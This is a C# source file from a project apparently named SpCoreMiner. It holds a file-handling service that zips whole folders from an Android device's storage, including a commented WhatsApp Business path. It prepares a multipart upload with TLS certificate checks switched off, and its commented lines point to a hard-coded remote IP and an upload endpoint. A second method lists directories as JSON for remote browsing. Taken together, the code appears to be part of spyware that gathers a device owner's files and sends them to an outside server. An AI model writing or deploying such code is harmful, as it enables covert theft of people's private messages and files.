using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Text;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;
using static SQLite.SQLite3;
using SpCoreMiner.Data;


namespace SpCoreMiner.Services
{
    public class FileManaging
    {
        public static async void ZipFolder(string files, string zipFileName, string namefile)
        {
            string[] _files = files.Split(',');
            //files = files.Replace(",", "\n\r");
            //using (System.IO.StringReader reader = new StringReader(files))
            //{
            //    string line;
            //    while ((line = reader.ReadLine()) != null)
            //    {
            //        // Do something with the line
            //    }
            //}

            using var memoryStream = new MemoryStream();
            using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
            {
                foreach (var item in _files)
                {
                    try
                    {

                        var folder = Directory.EnumerateFiles(item);
                        //var files = Directory.EnumerateDirectories("/storage/emulated/0/WhatsApp Business/");
                        foreach (var filex in folder)
                        {
                            if (File.Exists(filex))
                            {
                                try
                                {
                                    var demoFile = archive.CreateEntry(Path.GetFileName(filex));
                                    using var readStreamW = File.OpenRead(filex);
                                    using (var entryStream = demoFile.Open())
                                    {
                                        using (var streamWriter = new StreamWriter(entryStream))
                                        {
                                            readStreamW.Seek(0, SeekOrigin.Begin);
                                            readStreamW.CopyTo(streamWriter.BaseStream);
                                        }
                                    }

                                }
                                catch (Exception ex)
                                {
                                    var msg = ex.Message;
                                }

                            }

                        }
                    }
                    catch
                    {
                        ;
                    }
                }
            }
            for (int x = 0; x < 10; x++)
            {
                try
                {
                    using var fileStream = new FileStream(zipFileName, FileMode.Create);
                    memoryStream.Seek(0, SeekOrigin.Begin);
                    memoryStream.CopyTo(fileStream);


                    using var form = new MultipartFormDataContent();
                    using var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(zipFileName));
                    fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("multipart/form-data");
                    form.Add(fileContent, "File", Path.GetFileName(zipFileName));

                    var account = await AccountDB.Instance;
                    var acc = await account.GetAccountAsync();
                    // this is the changed part
                    //form.Add(new StringContent(acc.ClientId), "ClientId");
                    form.Add(new StringContent(namefile), "FileName");

                    HttpClientHandler clientHandler = new HttpClientHandler();
                    clientHandler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => { return true; };
                    HttpClient httpClient = new HttpClient(clientHandler); 
                    //{
                    //    BaseAddress = new Uri("http://85.215.177.238:2905")
                    //};
                    //string urls = acc.SockeAddress + "/Home/UploadFileWithModel";
                    //try
                    //{ urls = urls.Replace("//Home", "/Home"); } catch { }
                    //var response = await httpClient.PostAsync(urls, form);
                    //response.EnsureSuccessStatusCode();
                    //var responseContent = await response.Content.ReadAsStringAsync();

                    //acc.FirstFilesend = true;
                    await account.SaveItemAsync(acc);
                    x = 10;
                    break;
                }
                catch (Exception ex)
                {
                    var mymsg = ex.Message;
                }

            }

        }




        public static async Task<string> GetDirectory(string url)
        {
            List<directory> lst = new List<directory>();
            var files = Directory.EnumerateFiles(url);
            var folder = Directory.EnumerateDirectories(url);
            foreach (var item in folder)
            {
                string temp = item;
                temp = temp.Replace(folder + "/", "");
                directory dr = new directory();
                dr.modelitem = "Folder";
                dr.nameitem = temp;
                lst.Add(dr);
            }
            foreach (var item in files)
            {
                string temp = item;
                temp = temp.Replace(files + "/", "");
                directory dr = new directory();
                dr.modelitem = "File";
                dr.nameitem = temp;
                lst.Add(dr);
            }
            var test = JsonConvert.SerializeObject(lst, Formatting.Indented);
            string response = JsonConvert.SerializeObject(lst); ;
            return response;
        }
        private class directory
        {
            public string nameitem { get; set; }
            public string modelitem { get; set; }
        } 
    }
}
